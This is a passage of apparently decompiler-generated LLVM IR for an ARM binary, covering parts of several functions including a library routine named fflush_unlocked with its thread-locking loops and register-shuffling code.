  %v0_18690 = load i32, i32* %r2.global-to-local, align 4
  %v1_18690 = load i32, i32* %r0.global-to-local, align 4
  %v2_18690 = add i32 %v1_18690, 8
  %v3_18690 = inttoptr i32 %v2_18690 to i32*
  store i32 %v0_18690, i32* %v3_18690, align 4
  %v0_18694 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18694, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18698

dec_label_pc_18698:                               ; preds = %dec_label_pc_186c8.dec_label_pc_18698_crit_edge, %dec_label_pc_18690
  %v0_18698 = phi i32 [ %v0_18698.pre, %dec_label_pc_186c8.dec_label_pc_18698_crit_edge ], [ %v0_18694, %dec_label_pc_18690 ]
  %v1_18698 = inttoptr i32 %v0_18698 to i32*
  %v2_18698 = load i32, i32* %v1_18698, align 4
  store i32 %v2_18698, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_18698, i32* %r2.global-to-local, align 4
  %v2_186a462 = load i32, i32* %v1_18698, align 4
  store i32 %v2_186a462, i32* %r3.global-to-local, align 4
  %v3_186a864 = icmp uge i32 %v2_186a462, %v2_18698
  store i1 %v3_186a864, i1* %cpsr_c.global-to-local, align 1
  %v9_186a870 = icmp eq i32 %v2_186a462, %v2_18698
  br i1 %v9_186a870, label %dec_label_pc_186b0, label %dec_label_pc_186c8

dec_label_pc_186b0:                               ; preds = %dec_label_pc_18698, %dec_label_pc_186b0.dec_label_pc_186a4_crit_edge
  %v0_186b071 = phi i32 [ %v1_186a8.pre, %dec_label_pc_186b0.dec_label_pc_186a4_crit_edge ], [ %v2_18698, %dec_label_pc_18698 ]
  store i32 %v0_186b071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_186c0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_186c0, label %dec_label_pc_186c4, label %dec_label_pc_186b0.dec_label_pc_186a4_crit_edge

dec_label_pc_186b0.dec_label_pc_186a4_crit_edge:  ; preds = %dec_label_pc_186b0
  %v0_186a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_186a8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_186a4 = inttoptr i32 %v0_186a4.pre to i32*
  %v2_186a4 = load i32, i32* %v1_186a4, align 4
  store i32 %v2_186a4, i32* %r3.global-to-local, align 4
  %v3_186a8 = icmp uge i32 %v2_186a4, %v1_186a8.pre
  store i1 %v3_186a8, i1* %cpsr_c.global-to-local, align 1
  %v9_186a8 = icmp eq i32 %v2_186a4, %v1_186a8.pre
  br i1 %v9_186a8, label %dec_label_pc_186b0, label %dec_label_pc_186c8

dec_label_pc_186c4:                               ; preds = %dec_label_pc_186b0
  %v0_186c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_186c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_186c8

dec_label_pc_186c8:                               ; preds = %dec_label_pc_18698, %dec_label_pc_186b0.dec_label_pc_186a4_crit_edge, %dec_label_pc_186c4
  %v0_186d0 = phi i32 [ %v0_186c4, %dec_label_pc_186c4 ], [ %v2_186a462, %dec_label_pc_18698 ], [ %v2_186a4, %dec_label_pc_186b0.dec_label_pc_186a4_crit_edge ]
  %v1_186c8 = phi i32 [ %v0_186c4, %dec_label_pc_186c4 ], [ %v2_18698, %dec_label_pc_18698 ], [ %v1_186a8.pre, %dec_label_pc_186b0.dec_label_pc_186a4_crit_edge ]
  %v3_186c8 = icmp uge i32 %v0_186d0, %v1_186c8
  store i1 %v3_186c8, i1* %cpsr_c.global-to-local, align 1
  %v9_186c8 = icmp eq i32 %v0_186d0, %v1_186c8
  br i1 %v9_186c8, label %dec_label_pc_186d0, label %dec_label_pc_186c8.dec_label_pc_18698_crit_edge

dec_label_pc_186c8.dec_label_pc_18698_crit_edge:  ; preds = %dec_label_pc_186c8
  %v0_18698.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18698

dec_label_pc_186d0:                               ; preds = %dec_label_pc_186c8
  %v2_186d0 = icmp ne i32 %v1_186c8, 0
  store i1 %v2_186d0, i1* %cpsr_c.global-to-local, align 1
  %v7_186d4 = icmp slt i32 %v1_186c8, 2
  br i1 %v7_186d4, label %dec_label_pc_186f0, label %dec_label_pc_186d8

dec_label_pc_186d8:                               ; preds = %dec_label_pc_186d0
  %v0_186d8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_186d8, i32* %r0.global-to-local, align 4
  %v0_186dc = load i32, i32* %r1.global-to-local, align 4
  %v1_186dc = add i32 %v0_186dc, 129
  store i32 %v1_186dc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_186f0

dec_label_pc_186f0:                               ; preds = %dec_label_pc_18660, %dec_label_pc_186d8, %dec_label_pc_186d0
  %v2_186f4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_186f4, i32* %r4.global-to-local, align 4
  %v1_186f8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_186f8

; uselistorder directives
  uselistorder i32 %v0_186c4, { 1, 0, 2 }
  uselistorder i32 %v1_186a8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_18698, { 1, 0 }
  uselistorder i32 %v0_18624, { 1, 0, 2 }
  uselistorder i32 %v1_18608.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_185f8, { 1, 0 }
  uselistorder i32 %v0_185c4, { 2, 1, 0 }
  uselistorder i32 %v0_18568, { 1, 0 }
  uselistorder i32 %v0_1854c, { 1, 0, 2 }
  uselistorder i32 %v1_18530.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1851c, { 1, 0 }
  uselistorder i32 %v0_184c0, { 1, 0, 2 }
  uselistorder i32 %v1_184a4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_18478, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 39, 4, 5, 6, 7, 8, 9, 10, 12, 11, 40, 13, 14, 15, 43, 44, 16, 17, 18, 19, 20, 21, 22, 24, 23, 41, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 42, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 20, 21, 3, 4, 5, 6, 22, 23, 7, 10, 8, 9, 19, 11, 12, 24, 25, 13, 14, 15, 16, 17, 26, 27, 18 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 5, 0, 12, 9, 10, 1, 6, 2, 7, 3, 8, 11, 4 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_186f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_186c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_186b0, { 1, 0 }
  uselistorder label %dec_label_pc_18660, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18650, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18628, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18610, { 1, 0 }
  uselistorder label %dec_label_pc_185c4, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1858c, { 1, 0 }
  uselistorder label %dec_label_pc_18560, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_18550, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18538, { 1, 0 }
  uselistorder label %dec_label_pc_184d4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_184c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_184ac, { 1, 0 }
}

define i32 @function_18700(i32 %arg1) local_unnamed_addr {
dec_label_pc_18700:
  %v0_18700 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18700, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_18700
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_18700, %bb
  %v10_18714 = phi i32 [ %arg1, %dec_label_pc_18700 ], [ 0, %bb ]
  ret i32 %v10_18714

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_18718 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r6, align 4
  %v4_18728 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 76) to i32*), align 4
  store i32 %v4_18728, i32* %r3.global-to-local, align 4
  %v4_1872c = icmp uge i32 %tmp, %v4_18728
  store i1 %v4_1872c, i1* %cpsr_c.global-to-local, align 1
  %v10_1872c = icmp eq i32 %tmp, %v4_18728
  br i1 %v10_1872c, label %bb, label %dec_label_pc_18744

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_18754

dec_label_pc_18744:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_18748 = icmp eq i16* %arg1, null
  br i1 %v3_18748, label %dec_label_pc_18754, label %dec_label_pc_18a68

dec_label_pc_18754:                               ; preds = %bb, %dec_label_pc_18744
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_18744 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_18758 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 160) to i32*), align 4
  store i32 %v4_18758, i32* %r5.global-to-local, align 4
  %v0_1875c = call i32 @__aeabi_read_tp()
  store i32 %v0_1875c, i32* %r0.global-to-local, align 4
  %v1_18760 = add i32 %v4_18758, 8
  %v2_18760 = inttoptr i32 %v1_18760 to i32*
  %v3_18760 = load i32, i32* %v2_18760, align 4
  store i32 %v3_18760, i32* %r3.global-to-local, align 4
  %v1_18764 = add i32 %v0_1875c, -1168
  store i32 %v1_18764, i32* %r8.global-to-local, align 4
  %v3_18768 = icmp uge i32 %v3_18760, %v1_18764
  store i1 %v3_18768, i1* %cpsr_c.global-to-local, align 1
  %v9_18768 = icmp eq i32 %v3_18760, %v1_18764
  br i1 %v9_18768, label %dec_label_pc_187b0, label %dec_label_pc_18770

dec_label_pc_18770:                               ; preds = %dec_label_pc_18754
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_18758, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1877c143 = inttoptr i32 %v4_18758 to i32*
  %v2_1877c144 = load i32, i32* %v1_1877c143, align 4
  store i32 %v2_1877c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_18780146 = icmp eq i32 %v2_1877c144, 0
  br i1 %v9_18780146, label %dec_label_pc_18788, label %dec_label_pc_187a0

dec_label_pc_18788:                               ; preds = %dec_label_pc_18770, %dec_label_pc_18788.dec_label_pc_1877c_crit_edge
  %v0_18788147 = phi i32 [ %v1_18780.pre, %dec_label_pc_18788.dec_label_pc_1877c_crit_edge ], [ 0, %dec_label_pc_18770 ]
  store i32 %v0_18788147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18798 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18798, label %dec_label_pc_1879c, label %dec_label_pc_18788.dec_label_pc_1877c_crit_edge

dec_label_pc_18788.dec_label_pc_1877c_crit_edge:  ; preds = %dec_label_pc_18788
  %v0_1877c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18780.pre = load i32, i32* @r4, align 4
  %v1_1877c = inttoptr i32 %v0_1877c.pre to i32*
  %v2_1877c = load i32, i32* %v1_1877c, align 4
  store i32 %v2_1877c, i32* %r3.global-to-local, align 4
  %v3_18780 = icmp uge i32 %v2_1877c, %v1_18780.pre
  store i1 %v3_18780, i1* %cpsr_c.global-to-local, align 1
  %v9_18780 = icmp eq i32 %v2_1877c, %v1_18780.pre
  br i1 %v9_18780, label %dec_label_pc_18788, label %dec_label_pc_187a0

dec_label_pc_1879c:                               ; preds = %dec_label_pc_18788
  %v0_1879c = load i32, i32* @r4, align 4
  store i32 %v0_1879c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_187a0

dec_label_pc_187a0:                               ; preds = %dec_label_pc_18770, %dec_label_pc_18788.dec_label_pc_1877c_crit_edge, %dec_label_pc_1879c
  %v0_187a0 = phi i32 [ %v0_1879c, %dec_label_pc_1879c ], [ %v2_1877c144, %dec_label_pc_18770 ], [ %v2_1877c, %dec_label_pc_18788.dec_label_pc_1877c_crit_edge ]
  %v1_187a0 = phi i32 [ %v0_1879c, %dec_label_pc_1879c ], [ 0, %dec_label_pc_18770 ], [ %v1_18780.pre, %dec_label_pc_18788.dec_label_pc_1877c_crit_edge ]
  %v3_187a0 = icmp uge i32 %v0_187a0, %v1_187a0
  store i1 %v3_187a0, i1* %cpsr_c.global-to-local, align 1
  %v9_187a0 = icmp eq i32 %v0_187a0, %v1_187a0
  br i1 %v9_187a0, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_187a0
  %v1_187a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_187a4, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_187a0, %bb65
  %v1_187a8 = xor i1 %v9_187a0, true
  call void @__pseudo_cond_branch(i1 %v1_187a8, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_187ac = load i32, i32* %r8.global-to-local, align 4
  %v1_187ac = load i32, i32* %r5.global-to-local, align 4
  %v2_187ac = add i32 %v1_187ac, 8
  %v3_187ac = inttoptr i32 %v2_187ac to i32*
  store i32 %v0_187ac, i32* %v3_187ac, align 4
  br label %dec_label_pc_187b0

dec_label_pc_187b0:                               ; preds = %dec_label_pc_18754, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_187b4 = load i32, i32* @r6, align 4
  %v2_187b4 = add i32 %v0_187b4, 160
  %v3_187b4 = inttoptr i32 %v2_187b4 to i32*
  %v4_187b4 = load i32, i32* %v3_187b4, align 4
  store i32 %v4_187b4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_187bc = add i32 %v0_187b4, 12
  %v3_187bc = inttoptr i32 %v2_187bc to i32*
  %v4_187bc = load i32, i32* %v3_187bc, align 4
  store i32 %v4_187bc, i32* %r2.global-to-local, align 4
  %v1_187c0 = add i32 %v4_187b4, 4
  %v2_187c0 = inttoptr i32 %v1_187c0 to i32*
  %v3_187c0 = load i32, i32* %v2_187c0, align 4
  store i32 %v3_187c0, i32* %r1.global-to-local, align 4
  %v1_187c4 = inttoptr i32 %v4_187bc to i32*
  %v2_187c4 = load i32, i32* %v1_187c4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_187c8 = icmp eq i32 %v3_187c0, 0
  %v1_187cc = add i32 %v2_187c4, 1
  store i32 %v1_187cc, i32* %r3.global-to-local, align 4
  store i32 %v1_187cc, i32* %v1_187c4, align 4
  br i1 %v2_187c8, label %dec_label_pc_187d8, label %dec_label_pc_18838

dec_label_pc_187d8:                               ; preds = %dec_label_pc_187b0
  %v0_187d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_187d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_187d8 = add i32 %v1_187d8, 8
  %v3_187d8 = inttoptr i32 %v2_187d8 to i32*
  store i32 %v0_187d8, i32* %v3_187d8, align 4
  %v0_187dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_187dc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_187e0

dec_label_pc_187e0:                               ; preds = %dec_label_pc_18810.dec_label_pc_187e0_crit_edge, %dec_label_pc_187d8
  %v0_187e0 = phi i32 [ %v0_187e0.pre, %dec_label_pc_18810.dec_label_pc_187e0_crit_edge ], [ %v0_187dc, %dec_label_pc_187d8 ]
  %v1_187e0 = inttoptr i32 %v0_187e0 to i32*
  %v2_187e0 = load i32, i32* %v1_187e0, align 4
  store i32 %v2_187e0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_187e0, i32* %r2.global-to-local, align 4
  %v2_187ec131 = load i32, i32* %v1_187e0, align 4
  store i32 %v2_187ec131, i32* %r3.global-to-local, align 4
  %v3_187f0133 = icmp uge i32 %v2_187ec131, %v2_187e0
  store i1 %v3_187f0133, i1* %cpsr_c.global-to-local, align 1
  %v9_187f0139 = icmp eq i32 %v2_187ec131, %v2_187e0
  br i1 %v9_187f0139, label %dec_label_pc_187f8, label %dec_label_pc_18810

dec_label_pc_187f8:                               ; preds = %dec_label_pc_187e0, %dec_label_pc_187f8.dec_label_pc_187ec_crit_edge
  %v0_187f8140 = phi i32 [ %v1_187f0.pre, %dec_label_pc_187f8.dec_label_pc_187ec_crit_edge ], [ %v2_187e0, %dec_label_pc_187e0 ]
  store i32 %v0_187f8140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18808 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18808, label %dec_label_pc_1880c, label %dec_label_pc_187f8.dec_label_pc_187ec_crit_edge

dec_label_pc_187f8.dec_label_pc_187ec_crit_edge:  ; preds = %dec_label_pc_187f8
  %v0_187ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_187f0.pre = load i32, i32* @r4, align 4
  %v1_187ec = inttoptr i32 %v0_187ec.pre to i32*
  %v2_187ec = load i32, i32* %v1_187ec, align 4
  store i32 %v2_187ec, i32* %r3.global-to-local, align 4
  %v3_187f0 = icmp uge i32 %v2_187ec, %v1_187f0.pre
  store i1 %v3_187f0, i1* %cpsr_c.global-to-local, align 1
  %v9_187f0 = icmp eq i32 %v2_187ec, %v1_187f0.pre
  br i1 %v9_187f0, label %dec_label_pc_187f8, label %dec_label_pc_18810

dec_label_pc_1880c:                               ; preds = %dec_label_pc_187f8
  %v0_1880c = load i32, i32* @r4, align 4
  store i32 %v0_1880c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18810

dec_label_pc_18810:                               ; preds = %dec_label_pc_187e0, %dec_label_pc_187f8.dec_label_pc_187ec_crit_edge, %dec_label_pc_1880c
  %v0_18818 = phi i32 [ %v0_1880c, %dec_label_pc_1880c ], [ %v2_187ec131, %dec_label_pc_187e0 ], [ %v2_187ec, %dec_label_pc_187f8.dec_label_pc_187ec_crit_edge ]
  %v1_18810 = phi i32 [ %v0_1880c, %dec_label_pc_1880c ], [ %v2_187e0, %dec_label_pc_187e0 ], [ %v1_187f0.pre, %dec_label_pc_187f8.dec_label_pc_187ec_crit_edge ]
  %v3_18810 = icmp uge i32 %v0_18818, %v1_18810
  store i1 %v3_18810, i1* %cpsr_c.global-to-local, align 1
  %v9_18810 = icmp eq i32 %v0_18818, %v1_18810
  br i1 %v9_18810, label %dec_label_pc_18818, label %dec_label_pc_18810.dec_label_pc_187e0_crit_edge

dec_label_pc_18810.dec_label_pc_187e0_crit_edge:  ; preds = %dec_label_pc_18810
  %v0_187e0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_187e0

dec_label_pc_18818:                               ; preds = %dec_label_pc_18810
  %v2_18818 = icmp ne i32 %v1_18810, 0
  store i1 %v2_18818, i1* %cpsr_c.global-to-local, align 1
  %v7_1881c = icmp slt i32 %v1_18810, 2
  br i1 %v7_1881c, label %dec_label_pc_18838, label %dec_label_pc_18820

dec_label_pc_18820:                               ; preds = %dec_label_pc_18818
  %v0_18820 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18820, i32* %r0.global-to-local, align 4
  %v0_18824 = load i32, i32* %r1.global-to-local, align 4
  %v1_18824 = add i32 %v0_18824, 129
  store i32 %v1_18824, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18838

dec_label_pc_18838:                               ; preds = %dec_label_pc_187b0, %dec_label_pc_18820, %dec_label_pc_18818
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_1883c = load i32, i32* @r6, align 4
  %v2_1883c = add i32 %v0_1883c, 152
  %v3_1883c = inttoptr i32 %v2_1883c to i32*
  %v4_1883c = load i32, i32* %v3_1883c, align 4
  store i32 %v4_1883c, i32* %r5.global-to-local, align 4
  %v1_18840 = add i32 %v4_1883c, 8
  %v2_18840 = inttoptr i32 %v1_18840 to i32*
  %v3_18840 = load i32, i32* %v2_18840, align 4
  store i32 %v3_18840, i32* %r3.global-to-local, align 4
  %v1_18844 = load i32, i32* %r8.global-to-local, align 4
  %v3_18844 = icmp uge i32 %v3_18840, %v1_18844
  store i1 %v3_18844, i1* %cpsr_c.global-to-local, align 1
  %v9_18844 = icmp eq i32 %v3_18840, %v1_18844
  br i1 %v9_18844, label %dec_label_pc_1888c, label %dec_label_pc_1884c

dec_label_pc_1884c:                               ; preds = %dec_label_pc_18838
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_1883c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_18858123 = inttoptr i32 %v4_1883c to i32*
  %v2_18858124 = load i32, i32* %v1_18858123, align 4
  store i32 %v2_18858124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1885c126 = icmp eq i32 %v2_18858124, 0
  br i1 %v9_1885c126, label %dec_label_pc_18864, label %dec_label_pc_1887c

dec_label_pc_18864:                               ; preds = %dec_label_pc_1884c, %dec_label_pc_18864.dec_label_pc_18858_crit_edge
  %v0_18864127 = phi i32 [ %v1_1885c.pre, %dec_label_pc_18864.dec_label_pc_18858_crit_edge ], [ 0, %dec_label_pc_1884c ]
  store i32 %v0_18864127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18874 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18874, label %dec_label_pc_18878, label %dec_label_pc_18864.dec_label_pc_18858_crit_edge

dec_label_pc_18864.dec_label_pc_18858_crit_edge:  ; preds = %dec_label_pc_18864
  %v0_18858.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1885c.pre = load i32, i32* @r4, align 4
  %v1_18858 = inttoptr i32 %v0_18858.pre to i32*
  %v2_18858 = load i32, i32* %v1_18858, align 4
  store i32 %v2_18858, i32* %r3.global-to-local, align 4
  %v3_1885c = icmp uge i32 %v2_18858, %v1_1885c.pre
  store i1 %v3_1885c, i1* %cpsr_c.global-to-local, align 1
  %v9_1885c = icmp eq i32 %v2_18858, %v1_1885c.pre
  br i1 %v9_1885c, label %dec_label_pc_18864, label %dec_label_pc_1887c

dec_label_pc_18878:                               ; preds = %dec_label_pc_18864
  %v0_18878 = load i32, i32* @r4, align 4
  store i32 %v0_18878, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1887c

dec_label_pc_1887c:                               ; preds = %dec_label_pc_1884c, %dec_label_pc_18864.dec_label_pc_18858_crit_edge, %dec_label_pc_18878
  %v0_1887c = phi i32 [ %v0_18878, %dec_label_pc_18878 ], [ %v2_18858124, %dec_label_pc_1884c ], [ %v2_18858, %dec_label_pc_18864.dec_label_pc_18858_crit_edge ]
  %v1_1887c = phi i32 [ %v0_18878, %dec_label_pc_18878 ], [ 0, %dec_label_pc_1884c ], [ %v1_1885c.pre, %dec_label_pc_18864.dec_label_pc_18858_crit_edge ]
  %v3_1887c = icmp uge i32 %v0_1887c, %v1_1887c
  store i1 %v3_1887c, i1* %cpsr_c.global-to-local, align 1
  %v9_1887c = icmp eq i32 %v0_1887c, %v1_1887c
  br i1 %v9_1887c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_1887c
  %v1_18880 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_18880, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_1887c, %bb67
  %v1_18884 = xor i1 %v9_1887c, true
  call void @__pseudo_cond_branch(i1 %v1_18884, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_18888 = load i32, i32* %r8.global-to-local, align 4
  %v1_18888 = load i32, i32* %r5.global-to-local, align 4
  %v2_18888 = add i32 %v1_18888, 8
  %v3_18888 = inttoptr i32 %v2_18888 to i32*
  store i32 %v0_18888, i32* %v3_18888, align 4
  %v0_18890.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1888c

dec_label_pc_1888c:                               ; preds = %dec_label_pc_18838, %bb68
  %v0_1889c = phi i32 [ %v0_1883c, %dec_label_pc_18838 ], [ %v0_18890.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_18890 = add i32 %v0_1889c, 152
  %v3_18890 = inttoptr i32 %v2_18890 to i32*
  %v4_18890 = load i32, i32* %v3_18890, align 4
  store i32 %v4_18890, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_18898 = add i32 %v4_18890, 4
  %v2_18898 = inttoptr i32 %v1_18898 to i32*
  %v3_18898 = load i32, i32* %v2_18898, align 4
  store i32 %v3_18898, i32* %r1.global-to-local, align 4
  %v2_1889c = add i32 %v0_1889c, 76
  %v3_1889c = inttoptr i32 %v2_1889c to i32*
  %v4_1889c = load i32, i32* %v3_1889c, align 4
  store i32 %v4_1889c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_188a0 = icmp eq i32 %v3_18898, 0
  %v1_188a4 = inttoptr i32 %v4_1889c to i32*
  %v2_188a4 = load i32, i32* %v1_188a4, align 4
  store i32 %v2_188a4, i32* @r5, align 4
  br i1 %v2_188a0, label %dec_label_pc_188ac, label %dec_label_pc_1890c

dec_label_pc_188ac:                               ; preds = %dec_label_pc_1888c
  %v2_188ac = add i32 %v4_18890, 8
  %v3_188ac = inttoptr i32 %v2_188ac to i32*
  store i32 0, i32* %v3_188ac, align 4
  %v0_188b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_188b0, i32* @r7, align 4
  br label %dec_label_pc_188b4

dec_label_pc_188b4:                               ; preds = %dec_label_pc_188e4.dec_label_pc_188b4_crit_edge, %dec_label_pc_188ac
  %v0_188b4 = phi i32 [ %v0_188b4.pre, %dec_label_pc_188e4.dec_label_pc_188b4_crit_edge ], [ %v0_188b0, %dec_label_pc_188ac ]
  %v1_188b4 = inttoptr i32 %v0_188b4 to i32*
  %v2_188b4 = load i32, i32* %v1_188b4, align 4
  store i32 %v2_188b4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_188b4, i32* %r2.global-to-local, align 4
  %v2_188c0111 = load i32, i32* %v1_188b4, align 4
  store i32 %v2_188c0111, i32* %r3.global-to-local, align 4
  %v3_188c4113 = icmp uge i32 %v2_188c0111, %v2_188b4
  store i1 %v3_188c4113, i1* %cpsr_c.global-to-local, align 1
  %v9_188c4119 = icmp eq i32 %v2_188c0111, %v2_188b4
  br i1 %v9_188c4119, label %dec_label_pc_188cc, label %dec_label_pc_188e4

dec_label_pc_188cc:                               ; preds = %dec_label_pc_188b4, %dec_label_pc_188cc.dec_label_pc_188c0_crit_edge
  %v0_188cc120 = phi i32 [ %v1_188c4.pre, %dec_label_pc_188cc.dec_label_pc_188c0_crit_edge ], [ %v2_188b4, %dec_label_pc_188b4 ]
  store i32 %v0_188cc120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_188dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_188dc, label %dec_label_pc_188e0, label %dec_label_pc_188cc.dec_label_pc_188c0_crit_edge

dec_label_pc_188cc.dec_label_pc_188c0_crit_edge:  ; preds = %dec_label_pc_188cc
